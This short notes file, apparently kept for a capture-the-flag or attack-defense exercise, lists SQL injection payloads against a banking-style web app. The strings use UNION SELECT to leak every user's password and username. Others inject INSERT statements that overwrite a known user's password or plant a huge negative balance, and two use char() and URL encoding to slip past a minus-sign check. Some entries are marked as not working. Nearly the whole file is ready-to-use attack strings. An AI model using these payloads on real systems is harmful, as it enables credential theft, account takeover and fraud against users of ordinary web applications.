### PAYLOADS

### DATA PAYLOADS 

# negative value in value

# negative value in value with - encoded


### SQL PAYLOADS
## EXPLOIT SELECT

## Leak all users password (REMEMBER SPACE AFTER DOUBLE DASH)
' union select 1,2,pass from users;-- 

## Leak all usernames (REMEMBER SPACE AFTER DOUBLE DASH)
' union select 1,2,user from users;-- 

## Leak all usernames and password sorted (REMEMBER SPACE AFTER DOUBLE DASH, passwords are in wrong order, in balance)
' union select user,2,user from users union select 5,5,5 union select user,4,pass from users;-- 
' union (select user,2,user from users order by user) union select 5,5,5 union (select user,4,pass from users order by user);-- 


## EXPLOIT INSERT

## Leak password for known user (in user) #NOT WORKING
' AND (IF((SELECT P.pass FROM (select pass from users WHERE user = "aaa") as P) = "aa", sleep(10), select pass from users WHERE user = "aaa")) AND '

## Change password for known user (in register user)
notluca', 'dumbwhosreading'), ('kate', 'salvino') ON DUPLICATE KEY UPDATE pass='salvino';--%20

## DELETE ALL USERS #NOT WORKING
' AND (IF((DELETE FROM users) = "aa", sleep(10), 0)) AND '

## Make an user povero (in deposit) (if original users must be kept then this should work) (register an user luca before)
luca', 100), ('kate', -1000000);--%20

## Bypass - check (in amount of deposit) -400 000 000
'+char(45,52,48,48,48,48,48,48,48,48)+'

## Bypass - check (in amount of deposit) -8 000 000
%2D%38%30%30%30%30%30%30

## Delete all users
Not possible aot

## Drop all tables
Not possible aot